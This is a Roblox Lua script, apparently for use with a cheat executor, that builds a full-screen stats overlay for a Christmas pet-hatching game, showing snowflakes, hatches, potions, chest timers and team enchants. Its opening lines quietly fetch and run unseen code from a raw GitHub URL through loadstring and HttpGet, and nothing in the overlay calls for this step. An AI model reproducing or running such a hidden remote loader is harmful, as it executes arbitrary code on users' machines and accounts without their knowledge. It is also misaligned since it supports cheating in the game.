task.spawn(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/yummy"))()
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local lp = Players.LocalPlayer

local LocalData
pcall(function()
	LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
end)

local PetsModule
pcall(function()
	PetsModule = require(ReplicatedStorage.Shared.Data.Pets)
end)

if LocalData and LocalData.IsReady and not LocalData:IsReady() and LocalData.DataReady then
	LocalData.DataReady:Wait()
end

local function gd()
	local ok,d = pcall(function()
		return LocalData:Get()
	end)
	return ok and d or {}
end

local function fmt_num(n)
	n = tonumber(n) or 0
	if n >= 1e12 then return string.format("%.2fT", n/1e12)
	elseif n >= 1e9 then return string.format("%.2fB", n/1e9)
	elseif n >= 1e6 then return string.format("%.2fM", n/1e6)
	elseif n >= 1e3 then return string.format("%.2fK", n/1e3)
	else return tostring(math.floor(n)) end
end

local function getSnow() return gd().Snowflakes or 0 end
local function getHatches() return (gd().Stats and gd().Stats.Hatches) or 0 end

local CHEST_NAME = "Peppermint Chest"
local function getPepRemainingSeconds()
	local d = gd()
	local cds = d.Cooldowns
	if type(cds) ~= "table" then return nil end
	local ts = cds[CHEST_NAME] or cds["PeppermintChest"]
	if type(ts) == "number" then
		return math.max(0, ts - os.time())
	end
end

local function fmt_hms(sec)
	sec = math.max(0, math.floor(sec or 0))
	return string.format("%02d:%02d:%02d",
		math.floor(sec/3600),
		math.floor((sec%3600)/60),
		sec%60
	)
end

local function fmt_mmss_or_ready(sec)
	if sec == nil then return "NOT FOUND" end
	sec = math.max(0, math.floor(sec))
	if sec == 0 then return "READY !" end
	return string.format("%02d:%02d", math.floor(sec/60), sec%60)
end

local function getPotions()
	local d = gd()
	local fi, fe = 0, 0
	if d.Potions then
		for _,p in pairs(d.Potions) do
			if p.Name and p.Amount then
				if tostring(p.Name):find("Festive Infinity Elixir",1,true) then
					fi += tonumber(p.Amount) or 0
				elseif tostring(p.Name):find("Festive Elixir",1,true) then
					fe += tonumber(p.Amount) or 0
				end
			end
		end
	end
	return fi, fe
end

local ITEMS = {"Christmas Present","Christmas Key","Christmas Spin Ticket"}
local function getItems()
	local d = gd()
	local r = {}
	local function scan(t)
		for k,v in pairs(t) do
			if type(v) == "table" then scan(v)
			else
				for _,nm in ipairs(ITEMS) do
					if k == nm then r[nm] = v end
				end
			end
		end
	end
	scan(d)
	return r
end

local function getTeam()
	local d = gd()
	local ids = (d.Teams and d.TeamEquipped and d.Teams[d.TeamEquipped] and d.Teams[d.TeamEquipped].Pets) or {}
	local map = {}
	if d.Pets then
		for _,p in pairs(d.Pets) do map[tostring(p.Id)] = p end
	end
	local arr, sum = {}, 0
	for _,id in ipairs(ids) do
		local p = map[tostring(id)]
		if p and PetsModule and PetsModule[p.Name] and PetsModule[p.Name].Stats then
			local sf = PetsModule[p.Name].Stats.Snowflakes or 0
			sum += sf
			arr[#arr+1] = {Name=p.Name,Snow=sf,Enchants=p.Enchants or {}}
		end
	end
	return arr, sum
end

local function hasTeamUpEnchant(p)
	for _,e in ipairs(p.Enchants or {}) do
		if e.Id and string.lower(e.Id):sub(1,7) == "team-up" then
			return true
		end
	end
	return false
end

local function firstEnchantId(p)
	if not p.Enchants or #p.Enchants == 0 then return "None" end
	return p.Enchants[1].Id or "None"
end

local gui = Instance.new("ScreenGui", lp.PlayerGui)
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 9999999

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.new(0,0,0)

local function Section(x,y,w,h)
	local f = Instance.new("Frame", bg)
	f.AnchorPoint = Vector2.new(0.5,0.5)
	f.Position = UDim2.new(x,0,y,0)
	f.Size = UDim2.new(w,0,h,0)
	f.BackgroundTransparency = 1
	local ar = Instance.new("UIAspectRatioConstraint", f)
	ar.AspectRatio = 4
	ar.DominantAxis = Enum.DominantAxis.Height
	return f
end

local function NewText(p)
	local t = Instance.new("TextLabel", p)
	t.Size = UDim2.new(1,0,1,0)
	t.BackgroundTransparency = 1
	t.Font = Enum.Font.GothamBlack
	t.TextScaled = true
	t.TextWrapped = true
	t.TextColor3 = Color3.new(1,1,1)
	return t
end

local USER = NewText(Section(0.5,0.12,0.6,0.1))
USER.Text = "ðŸ¥š "..lp.Name

local BIG = NewText(Section(0.5,0.22,0.7,0.18))
local RATE = NewText(Section(0.5,0.34,0.5,0.12))

local TL = NewText(Section(0.22,0.08,0.4,0.12))
TL.TextXAlignment = Enum.TextXAlignment.Left

local SESSION = NewText(Section(0.78,0.08,0.36,0.08))
local PEP = NewText(Section(0.78,0.14,0.20,0.05))

local ML = NewText(Section(0.22,0.50,0.42,0.09))
ML.TextXAlignment = Enum.TextXAlignment.Left

local MSG = NewText(Section(0.52,0.50,0.75,0.11))
MSG.TextTransparency = 1
MSG.TextScaled = false
MSG.TextSize = 24
MSG.TextXAlignment = Enum.TextXAlignment.Center
MSG.TextYAlignment = Enum.TextYAlignment.Center

local petsFrame = Instance.new("Frame", bg)
petsFrame.Position = UDim2.new(0.02,0,0.86,0)
petsFrame.Size = UDim2.new(0.38,0,0.22,0)
petsFrame.BackgroundColor3 = Color3.fromRGB(18,18,20)
Instance.new("UICorner", petsFrame)

local petsList = Instance.new("TextLabel", petsFrame)
petsList.Size = UDim2.new(1,-16,1,-16)
petsList.Position = UDim2.new(0,8,0,8)
petsList.BackgroundTransparency = 1
petsList.Font = Enum.Font.Gotham
petsList.TextSize = 16
petsList.TextWrapped = true
petsList.TextXAlignment = Enum.TextXAlignment.Left
petsList.TextYAlignment = Enum.TextYAlignment.Top
petsList.TextColor3 = Color3.fromRGB(220,220,220)

local enchantFrame = Instance.new("Frame", bg)
enchantFrame.AnchorPoint = Vector2.new(1,1)
enchantFrame.Position = UDim2.new(0.98,0,0.86,0)
enchantFrame.Size = UDim2.new(0.22,0,0.22,0)
enchantFrame.BackgroundColor3 = Color3.fromRGB(18,18,20)
Instance.new("UICorner", enchantFrame)

local enchantList = Instance.new("TextLabel", enchantFrame)
enchantList.Size = UDim2.new(1,-16,1,-16)
enchantList.Position = UDim2.new(0,8,0,8)
enchantList.BackgroundTransparency = 1
enchantList.Font = Enum.Font.Gotham
enchantList.TextSize = 14
enchantList.TextWrapped = true
enchantList.TextXAlignment = Enum.TextXAlignment.Left
enchantList.TextYAlignment = Enum.TextYAlignment.Top
enchantList.TextColor3 = Color3.fromRGB(220,220,220)

local eggValue = NewText(Section(0.78,0.60,0.22,0.08))

local samples = {}
local function push(v)
	samples[#samples+1] = {t=tick(),v=v}
	while #samples>1 and tick()-samples[1].t>60 do
		table.remove(samples,1)
	end
end

local function perMin()
	if #samples < 2 then return 0 end
	local a,b = samples[1],samples[#samples]
	return ((b.v-a.v)/(b.t-a.t))*60
end

local queue = {}
local function addMsg(m)
	if queue[#queue] ~= m then
		queue[#queue+1] = m
	end
end

local function fadeMsg(t)
	MSG.Text = t
	MSG.TextTransparency = 1
	TweenService:Create(MSG,TweenInfo.new(0.35),{TextTransparency=0}):Play()
end

local startTick = tick()
local lastSnow = getSnow()
local lastHatch = getHatches()
local smoothSnow = lastSnow

RunService.Heartbeat:Connect(function(dt)
	local snow = getSnow()
	push(snow)
	smoothSnow += (snow - smoothSnow) * math.clamp(dt*6,0,1)

	BIG.Text = "â„ï¸ "..fmt_num(smoothSnow)
	RATE.Text = "â„ï¸/min: "..fmt_num(perMin())
	SESSION.Text = "â±ï¸ Session: "..fmt_hms(tick()-startTick)
	PEP.Text = "ðŸ¬ Peppermint Chest:\n"..fmt_mmss_or_ready(getPepRemainingSeconds())

	local items = getItems()
	local pres = items["Christmas Present"] or 0
	local keys = items["Christmas Key"] or 0
	local spins = items["Christmas Spin Ticket"] or 0

	local fi, fe = getPotions()
	TL.Text =
		"ðŸ§ª Inventory potions\n"..
		"âœ¨ Festive Infinity Elixirs : "..fmt_num(fi).."\n"..
		"ðŸ”® Festive Elixirs : "..fmt_num(fe).."\n"..
		"ðŸ—ï¸ "..fmt_num(keys).."   ðŸŽ¡ "..fmt_num(spins)

	ML.Text = "ðŸŽ Christmas Presents: "..fmt_num(pres)
	eggValue.Text = "ðŸ¥š "..fmt_num(getHatches())

	local arr,sum = getTeam()
	if #arr > 0 then
		local l = {"â„ï¸ Total Multi : "..fmt_num(sum),""}
		for _,p in ipairs(arr) do
			l[#l+1] = "ðŸ¾ "..p.Name.." x"..fmt_num(p.Snow).." â„ï¸"
		end
		petsList.Text = table.concat(l,"\n")

		local e = {}
		for _,p in ipairs(arr) do
			e[#e+1] = "ðŸ¾ "..p.Name.." > "..firstEnchantId(p).." "..(hasTeamUpEnchant(p) and "âœ…" or "âŒ")
		end
		enchantList.Text = table.concat(e,"\n")
	end

	if snow > lastSnow then addMsg("â„ï¸ Automatically Giving\nGifts") end
	if getHatches() > lastHatch then addMsg("ðŸ¥š Hatching\nEggs") end

	lastSnow = snow
	lastHatch = getHatches()
end)

task.spawn(function()
	while true do
		if #queue > 0 then
			local m = table.remove(queue,1)
			fadeMsg(m)
			task.wait(6)
			TweenService:Create(MSG,TweenInfo.new(0.3),{TextTransparency=1}):Play()
		end
		task.wait(0.4)
	end
end)
